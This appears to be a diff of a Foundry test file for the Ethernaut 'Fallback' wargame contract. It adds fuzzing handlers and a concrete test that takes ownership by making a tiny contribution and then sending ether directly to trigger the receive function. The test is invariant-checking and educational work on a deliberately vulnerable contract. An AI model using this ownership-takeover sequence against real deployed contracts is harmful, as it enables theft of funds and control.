@@ -55,22 +55,33 @@ contract Fallback {
 contract Handler is CommonBase, StdCheats, StdUtils {
 
     Fallback public fback;
+    address attacker;
 
-    constructor(Fallback _fback) {
+    constructor(Fallback _fback, address _attacker) {
         fback = _fback;
+        attacker = _attacker;
+
     }
 
     function sendToFallback(uint256 amount) public {
-        //amount = bound(amount, 0, 0.001 ether);
+        amount = bound(amount, 1, address(attacker).balance);
+        console.log(address(attacker).balance);
+        //vm.assume(amount > 0 wei && amount < 10 wei);
+        //deal(address(attacker), 100000);
 
+        vm.prank(address(attacker));
         // direct transfer of amount to Fallback contract
         (bool ok,) = address(fback).call{value: amount}(""); 
         require(ok, "sendToFallback failed");
     }
 
-    function contribute() public {
-
-        fback.contribute();
+    function contribute(uint256 amount) payable public {
+    // Ensure the provided Ether is within the specified bounds
+    amount = bound(amount, 1, address(attacker).balance);
+    
+    // Prank as the attacker and call contribute on the fback contract
+    vm.prank(attacker);
+    fback.contribute{value: amount}();
     }
 
 
@@ -83,24 +94,24 @@ contract FallbackTest is Test {
     function setUp() public {
         // Deploy the Fallback contract
         fback = new Fallback();
-        handler = new Handler(fback);
-        // Initialize the attacker address (could be any address)
         attacker = address(0x1234);
 
-        vm.deal(attacker, 1 ether); // Fund attacker with 1 ether
-        vm.deal(address(fback), 10 ether); // Fund fback with 10 ether
+        deal(attacker, 100 wei); // Fund attacker
+        deal(address(fback), 1000 wei); // Fund fback
 
-        bytes4[] memory selectors = new bytes4[](2);
-        selectors[0] = Handler.contribute.selector;
-        selectors[1] = Handler.sendToFallback.selector;
+        handler = new Handler(fback, attacker);
 
-
+        //deal(address(handler), 100 * 1e18);
         targetContract(address(handler));
-        // this is used to target specific functions for the random execution by the Foundry
-        targetSelector(
-            FuzzSelector({addr: address(handler), selectors: selectors})
-        );
-        targetSender(attacker);
+
+        // bytes4[] memory selectors = new bytes4[](2);
+        // selectors[0] = Handler.contribute.selector;
+        // selectors[1] = Handler.sendToFallback.selector;       
+        // // this is used to target specific functions for the random execution by the Foundry
+        // targetSelector(
+        //     FuzzSelector({addr: address(handler), selectors: selectors})
+        // );
+        //targetSender(attacker);
     }
 
     function invariant_OwnerIsNotAttacker() public view{
@@ -117,4 +128,43 @@ contract FallbackTest is Test {
     // }
 
     //receive() external payable {}
+}
+
+contract FallbackTest1 is Test {
+    Fallback fback;
+    address attacker;
+
+    function setUp() public {
+        fback = new Fallback();
+        attacker = address(0x1234);
+
+        // Ensure both fback and attacker have enough Ether
+        deal(address(fback), 10 ether);
+        deal(attacker, 1 ether);
+    }
+
+    function testBreakInvariant() public {
+        // Make the attacker contribute a small amount
+        vm.prank(attacker);
+        fback.contribute{value: 0.0001 ether}();
+        // owner not changed yet
+        assertEq(fback.owner(), address(this));
+
+        // Check if the contribution is registered
+        uint contribution = fback.getContribution();
+        assertTrue(contribution >= 0.0001 ether);
+
+        // Send Ether directly to trigger the receive function
+        vm.prank(attacker);
+        (bool sent,) = address(fback).call{value: 1 wei}("");
+        assertTrue(sent);
+
+        // Check if the attacker is now the owner
+        assertEq(fback.owner(), attacker);
+
+        // If this assertion passes, the invariant is effectively broken
+    }
+    function invariant_1() public {
+        assert(fback.owner() != attacker);
+    }
 }
